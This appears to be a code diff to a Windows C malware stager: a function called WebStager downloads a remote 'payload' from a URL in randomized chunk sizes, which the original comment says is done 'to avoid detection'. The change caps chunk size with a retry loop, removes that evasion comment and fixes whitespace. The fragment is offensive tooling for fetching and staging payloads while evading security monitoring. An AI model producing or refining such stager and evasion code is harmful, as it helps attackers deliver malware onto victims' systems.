@@ -67,8 +67,10 @@ BOOL WebStager(LPCWSTR szUrl, LPCWSTR szUserAgent, PBYTE* pPayloadBytes, SIZE_T*
 
     // Read payload in variable-sized chunks
     while (TRUE) {
-        // Randomize chunk size to avoid detection
-        chunkSize = 512 + (rand() % 1024);
+        // Generate chunk size and check if it's <= 1024
+        do {
+            chunkSize = 512 + (rand() % 1024);
+        } while (chunkSize > 1024);
 
         // Read file chunk
         if (!InternetReadFile(hInternetFile, pTmpBytes, chunkSize, &dwBytesRead)) {
@@ -126,5 +128,5 @@ _EndOfFunction:
     if (pTmpBytes)
         HeapFree(hHeap, 0, pTmpBytes);
 
-    return bSTATE; 
+    return bSTATE;
 }
